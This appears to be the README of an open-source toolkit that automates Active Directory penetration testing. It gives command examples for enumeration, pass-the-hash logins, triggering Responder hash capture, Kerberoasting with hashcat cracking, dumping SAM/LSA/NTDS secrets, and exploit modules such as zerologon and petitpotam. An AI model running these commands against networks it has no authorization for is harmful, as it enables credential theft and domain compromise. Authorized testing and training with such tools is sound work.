# AD Recon

A collection of automated enumeration tools for Active Directory penetration testing and CTF challenges. Built around [NetExec](https://github.com/Pennyw0rth/NetExec) and other standard tools.

## Tools Overview

| Tool | Description |
|------|-------------|
| `nxc_auto.py` | Multi-protocol scanner using NetExec |
| `ldap-deep.py` | Deep LDAP enumeration with ldapsearch/Impacket |
| `smb-deep.py` | Comprehensive SMB enumeration |
| `responder-trigger.py` | Protocol hash capture provocateur for Responder |

---

## Requirements

- Python 3.6+
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Impacket](https://github.com/fortra/impacket)
- ldap-utils (`apt install ldap-utils`)
- smbclient (`apt install smbclient`)
- rpcclient (`apt install samba-common-bin`)
- enum4linux-ng (optional)
- faketime + ntpdate (for clock skew fix)

### Quick Install (Kali/Debian)

```bash
sudo apt install python3 ldap-utils smbclient samba-common-bin faketime ntpdate
pip3 install netexec impacket

git clone https://github.com/r04d5/nxc_auto.git
cd nxc_auto
chmod +x *.py
```

---

## 1. nxc_auto.py

**Multi-protocol NetExec automation** - Scans all common AD protocols in one command.

### Features

- Scans SMB, WMI, WinRM, MSSQL, LDAP, SSH, RDP, VNC, FTP
- Smart connectivity check before deep enumeration
- Automatic clock skew detection and faketime fix for Kerberos attacks
- Real-time output with Markdown report generation

### Usage

```bash
# Full scan - all protocols
./nxc_auto.py 10.10.11.45 -u user -p 'password'

# Single protocol
./nxc_auto.py smb 10.10.11.45 -u user -p 'password'

# Anonymous/null session
./nxc_auto.py 10.10.11.45
```

### Supported Protocols & Enumeration

| Protocol | Flags |
|----------|-------|
| **SMB** | `--shares` `--users` `--groups` `--pass-pol` `--rid-brute` |
| **LDAP** | `--trusted-for-delegation` `--password-not-required` `--users` `--asreproast` `--kerberoasting` |
| **MSSQL** | `--databases` `--proxy-info` `-M mssql_priv` |
| **Others** | Connectivity check only |

### Output

Generates `nxc_report_<IP>.md` with all command outputs.

---

## 2. responder-trigger.py

**Protocol Hash Capture Provocateur** - Sends fake solicitations to trigger Responder hash capture.

### Features

- Triggers 13+ protocols that Responder can intercept
- Broadcast/multicast protocols (LLMNR, NBT-NS, mDNS)
- TCP protocols (SMB, HTTP, LDAP, MSSQL, FTP, SMTP, POP3, IMAP)
- Continuous loop mode for persistent triggering
- Pure Python, no dependencies required

### Usage

```bash
# Trigger all protocols against Responder IP
./responder-trigger.py 192.168.1.100

# Only broadcast protocols (no target needed)
./responder-trigger.py --broadcast

# Specific protocols only
./responder-trigger.py 192.168.1.100 --protocols llmnr nbtns smb

# Multiple iterations
./responder-trigger.py 192.168.1.100 --count 5

# Continuous mode (loop forever)
./responder-trigger.py 192.168.1.100 --loop --delay 10
```

### Supported Protocols

| Protocol | Port | Type | Description |
|----------|------|------|-------------|
| **LLMNR** | UDP 5355 | Multicast | Link-Local Multicast Name Resolution |
| **NBT-NS** | UDP 137 | Broadcast | NetBIOS Name Service |
| **mDNS** | UDP 5353 | Multicast | Multicast DNS |
| **SMB** | TCP 445 | Unicast | SMB/CIFS Connection |
| **HTTP** | TCP 80 | Unicast | HTTP/WPAD Requests |
| **HTTPS** | TCP 443 | Unicast | HTTPS Requests |
| **WebDAV** | TCP 80 | Unicast | WebDAV PROPFIND |
| **LDAP** | TCP 389 | Unicast | LDAP Bind Request |
| **MSSQL** | TCP 1433 | Unicast | MS-SQL Pre-login |
| **FTP** | TCP 21 | Unicast | FTP Connection |
| **SMTP** | TCP 25 | Unicast | SMTP Connection |
| **POP3** | TCP 110 | Unicast | POP3 Connection |
| **IMAP** | TCP 143 | Unicast | IMAP Connection |

### Typical Workflow

1. Start Responder on your attack machine:
   ```bash
   sudo responder -I eth0 -wrf
   ```

2. Run responder-trigger from victim network (or simulate):
   ```bash
   ./responder-trigger.py <responder_ip> --loop
   ```

3. Captured hashes appear in Responder output and logs.

---

## 3. ldap-deep.py

**Comprehensive LDAP enumeration** - Deep dive into Active Directory via LDAP queries.

### Features

- Auto-detects best bind format (UPN vs NetBIOS)
- Password or NTLM hash authentication
- 10+ enumeration categories
- BloodHound collection integration
- Quick mode for faster scans

### Usage

```bash
# Password authentication
./ldap-deep.py 10.10.11.45 -d corp.local -u user -p 'password'

# Hash authentication (Pass-The-Hash)
./ldap-deep.py 10.10.11.45 -d corp.local -u user -H ':aad3b435b51404ee'

# Quick mode
./ldap-deep.py 10.10.11.45 -d corp.local -u user -p 'password' --quick

# With BloodHound collection
./ldap-deep.py 10.10.11.45 -d corp.local -u user -p 'password' --bloodhound
```

### Enumeration Categories

| Section | What's Enumerated |
|---------|-------------------|
| **Domain Info** | Domain Controllers, Functional Level |
| **Users** | All users, descriptions, disabled, password flags |
| **Kerberos** | AS-REP Roastable, Kerberoastable users |
| **Delegation** | Unconstrained, Constrained, RBCD |
| **Groups** | Domain Admins, Enterprise Admins, Operators, etc. |
| **Computers** | All machines, servers, OS versions |
| **LAPS** | Legacy and Windows LAPS passwords |
| **GPO** | Group Policy Objects, Password Policy |
| **Trusts** | Domain Trust Relationships |
| **Misc** | Machine Account Quota, AdminSDHolder, Recent accounts |

### Output

Generates `ldap_deep_<domain>.md` with all query results.

---

## 4. smb-deep.py

**Comprehensive SMB enumeration** - Deep SMB/RPC enumeration with multiple tools.

### Features

- NetExec, smbclient, rpcclient, enum4linux-ng integration
- Password or NTLM hash authentication
- Share spidering option
- Vulnerability checks (EternalBlue, PrintNightmare, Coercion)
- Secrets dumping (requires admin)

### Usage

```bash
# Password authentication
./smb-deep.py 10.10.11.45 -d corp.local -u user -p 'password'

# Hash authentication (Pass-The-Hash)
./smb-deep.py 10.10.11.45 -d corp.local -u user -H ':ntlmhash'

# Quick mode
./smb-deep.py 10.10.11.45 -d corp.local -u user -p 'password' --quick

# Spider shares for files
./smb-deep.py 10.10.11.45 -d corp.local -u user -p 'password' --spider

# Dump secrets (admin required)
./smb-deep.py 10.10.11.45 -d corp.local -u admin -p 'password' --secrets
```

### Enumeration Categories

| Section | What's Enumerated |
|---------|-------------------|
| **Connectivity** | SMB version, signing status, null auth |
| **Shares** | Share listing with permissions |
| **Users** | Domain users, RID brute, logged on users |
| **Groups** | Domain groups, local groups, admin members |
| **Policy** | Password policy |
| **Sessions** | Active sessions, disk enumeration |
| **Files** | SYSVOL/NETLOGON contents, GPP passwords |
| **Vulns** | EternalBlue, PrintNightmare, Coercion, ZeroLogon |
| **Secrets** | SAM, LSA, NTDS.dit, LAPS (admin only) |
| **Extra** | AV detection, installed software, ADCS |

### Output

Generates `smb_deep_<IP>.md` with all results.

---

## Common Issues & Solutions

### Clock Skew (Kerberos)

```
KRB_AP_ERR_SKEW(Clock skew too great)
```

**Solution:** `nxc_auto.py` handles this automatically with faketime, or manually:
```bash
# Sync time with DC
sudo ntpdate 10.10.11.45

# Or use faketime
faketime "$(ntpdate -q 10.10.11.45 | head -n1 | cut -d ' ' -f 1,2)" nxc ldap ...
```

### LDAP Simple Bind Fails

```
ldap_bind: Invalid credentials (49)
```

**Solutions:**
1. Use UPN format: `user@domain.local` instead of `DOMAIN\user`
2. Use NetExec (NTLM-based): `nxc ldap 10.10.11.45 -u user -p pass`
3. Use Impacket with hash: `./ldap-deep.py ... -H ':hash'`

### SMB Signing Enabled

Cannot relay credentials when signing is enabled. Focus on:
- Credential theft (LSASS, SAM, etc.)
- Kerberos attacks (AS-REP, Kerberoasting)
- Exploits (if vulnerable)

---

## Pentesting Workflow

### 1. Initial Enumeration

```bash
# Quick all-protocol scan
./nxc_auto.py 10.10.11.45

# With credentials
./nxc_auto.py 10.10.11.45 -u user -p 'pass'
```

### 2. Deep Protocol Enumeration

```bash
# SMB deep dive
./smb-deep.py 10.10.11.45 -d corp.local -u user -p 'pass'

# LDAP deep dive
./ldap-deep.py 10.10.11.45 -d corp.local -u user -p 'pass'
```

### 3. Kerberos Attacks

```bash
# Kerberoasting hashes
nxc ldap 10.10.11.45 -u user -p 'pass' --kerberoasting output.txt

# Crack with hashcat
hashcat -m 13100 output.txt wordlist.txt
```

### 4. Privilege Escalation

```bash
# Admin? Dump secrets
./smb-deep.py 10.10.11.45 -d corp.local -u admin -p 'pass' --secrets

# Check for vulns
nxc smb 10.10.11.45 -u user -p 'pass' -M zerologon -M nopac -M petitpotam
```

---

## License

MIT License

## Disclaimer

These tools are for authorized security testing only. Always obtain proper authorization before testing systems you do not own.
